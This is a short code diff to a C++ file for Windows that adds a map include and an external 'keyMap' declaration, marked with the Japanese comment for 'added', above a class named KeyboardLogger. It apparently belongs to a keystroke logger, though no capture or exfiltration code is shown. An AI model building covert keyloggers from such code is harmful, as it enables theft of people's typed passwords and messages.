@@ -4,6 +4,9 @@
 #include <windows.h>
 #include <fstream>
 #include <chrono>
+#include <map>
+
+extern std::map<int, std::string> keyMap; // 追加
 
 class KeyboardLogger {
 public:
